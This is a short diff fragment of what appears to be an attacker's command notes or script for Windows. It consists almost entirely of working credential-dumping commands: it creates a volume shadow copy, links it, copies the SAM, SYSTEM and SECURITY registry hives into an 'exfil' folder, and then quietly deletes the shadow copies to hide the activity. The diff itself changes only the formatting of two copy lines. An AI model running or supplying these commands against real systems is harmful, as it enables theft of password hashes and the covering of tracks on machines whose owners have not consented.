@@ -24,8 +24,8 @@ vssadmin create shadow /for=C:   -->   \\?\GLOBALROOT\Device\HarddiskVolumeShado
 cmd /c mklink /d C:\shadow_drive \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 
 copy C:\shadow_drive\Windows\System32\config\SAM C:\exfil\SAM
->> copy C:\shadow_drive\Windows\System32\config\SYSTEM C:\exfil\SYSTEM
->> copy C:\shadow_drive\Windows\System32\config\SECURITY C:\exfil\SECURITY
+copy C:\shadow_drive\Windows\System32\config\SYSTEM C:\exfil\SYSTEM
+copy C:\shadow_drive\Windows\System32\config\SECURITY C:\exfil\SECURITY
 
 vssadmin delete shadows /for=C: /quiet
 
